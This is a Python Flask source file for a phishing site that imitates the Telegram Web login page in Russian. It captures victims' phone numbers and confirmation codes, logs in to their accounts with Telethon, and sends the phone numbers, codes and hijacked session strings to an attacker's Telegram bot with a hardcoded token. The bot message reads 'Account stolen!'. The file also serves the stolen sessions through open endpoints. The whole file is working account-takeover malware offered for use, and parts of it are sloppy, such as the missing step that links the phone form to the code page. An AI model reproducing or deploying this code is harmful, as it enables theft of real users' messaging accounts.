from flask import Flask, request, render_template_string
import sqlite3
import requests
from datetime import datetime
import asyncio
from telethon import TelegramClient
from telethon.sessions import StringSession

app = Flask(__name__)

DB_PATH = "/tmp/accounts.db"
BOT_TOKEN = "8627663789:AAG8P_9rVLHh27fP5ClEr2UxIOM03SIUt-g"
ADMIN_ID = "5997698639"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            phone TEXT,
            code TEXT,
            session_string TEXT,
            created_at TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

init_db()

LOGIN_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Telegram Web</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial, sans-serif; background: #1f1f1f; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 20px; border-radius: 10px; text-align: center; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #2aab6e; color: white; border: none; border-radius: 5px; font-size: 16px; }
        h2 { color: #2aab6e; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Telegram Web</h2>
        <form method="POST">
            <input type="text" name="phone" placeholder="Номер телефона" required>
            <button type="submit">Продолжить</button>
        </form>
    </div>
</body>
</html>
'''

CODE_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Telegram Web</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial, sans-serif; background: #1f1f1f; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 20px; border-radius: 10px; text-align: center; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #2aab6e; color: white; border: none; border-radius: 5px; font-size: 16px; }
        h2 { color: #2aab6e; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Код подтверждения</h2>
        <p>Введите код, отправленный в Telegram</p>
        <form method="POST">
            <input type="hidden" name="phone" value="{{ phone }}">
            <input type="text" name="code" placeholder="Код" required>
            <button type="submit">Подтвердить</button>
        </form>
    </div>
</body>
</html>
'''

SUCCESS_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Telegram Web</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial, sans-serif; background: #1f1f1f; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 20px; border-radius: 10px; text-align: center; }
        h2 { color: #2aab6e; }
    </style>
</head>
<body>
    <div class="container">
        <h2>✅ Вход выполнен</h2>
        <p>Перенаправление...</p>
        <script>setTimeout(function(){ window.location.href = "https://web.telegram.org"; }, 3000);</script>
    </div>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        phone = request.form.get('phone')
        if phone:
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("INSERT INTO sessions (phone, created_at) VALUES (?, ?)", 
                      (phone, datetime.now().isoformat()))
            session_id = c.lastrowid
            conn.commit()
            conn.close()
            
            msg = f"📱 *Новый вход!*\n\nТелефон: `{phone}`\nID: {session_id}"
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                         json={"chat_id": ADMIN_ID, "text": msg, "parse_mode": "Markdown"})
            
            return render_template_string(CODE_PAGE, phone=phone)
    return render_template_string(LOGIN_PAGE)

@app.route('/code/<int:sess_id>', methods=['GET', 'POST'])
def code(sess_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT phone FROM sessions WHERE id=?", (sess_id,))
    row = c.fetchone()
    conn.close()
    
    if not row:
        return "Сессия не найдена", 404
    
    phone = row[0]
    
    if request.method == 'POST':
        code = request.form.get('code')
        if code:
            # Пытаемся войти в аккаунт
            session_string = login_to_telegram(phone, code)
            
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            if session_string:
                c.execute("UPDATE sessions SET code=?, session_string=? WHERE id=?", (code, session_string, sess_id))
                msg = f"✅ *Аккаунт украден!*\n\nТелефон: `{phone}`\n\nСтрока сессии:\n`{session_string}`"
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                             json={"chat_id": ADMIN_ID, "text": msg, "parse_mode": "Markdown"})
            else:
                c.execute("UPDATE sessions SET code=? WHERE id=?", (code, sess_id))
                msg = f"🔑 *Код подтверждения!*\n\nТелефон: `{phone}`\nКод: `{code}`"
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                             json={"chat_id": ADMIN_ID, "text": msg, "parse_mode": "Markdown"})
            conn.commit()
            conn.close()
            
            return render_template_string(SUCCESS_PAGE)
    
    return render_template_string(CODE_PAGE, phone=phone)

def login_to_telegram(phone, code):
    """Вход в Telegram и получение строки сессии"""
    try:
        # Создаём событийный цикл
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(), 0, '')
        loop.run_until_complete(client.connect())
        
        # Пытаемся войти с кодом
        try:
            loop.run_until_complete(client.sign_in(phone, code))
        except:
            # Если запрашивает пароль 2FA
            return None
        
        # Получаем строку сессии
        session_string = StringSession.save(client.session)
        loop.run_until_complete(client.disconnect())
        loop.close()
        
        return session_string
    except:
        return None

@app.route('/sessions', methods=['GET'])
def list_sessions():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, phone, code, session_string FROM sessions ORDER BY id DESC")
    rows = c.fetchall()
    conn.close()
    return {"sessions": [{"id": r[0], "phone": r[1], "code": r[2], "session": r[3]} for r in rows]}

@app.route('/session/<int:acc_id>', methods=['GET'])
def get_session(acc_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT session_string FROM sessions WHERE id=?", (acc_id,))
    row = c.fetchone()
    conn.close()
    if row and row[0]:
        return {"session": row[0]}
    return {"error": "not found"}, 404

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)
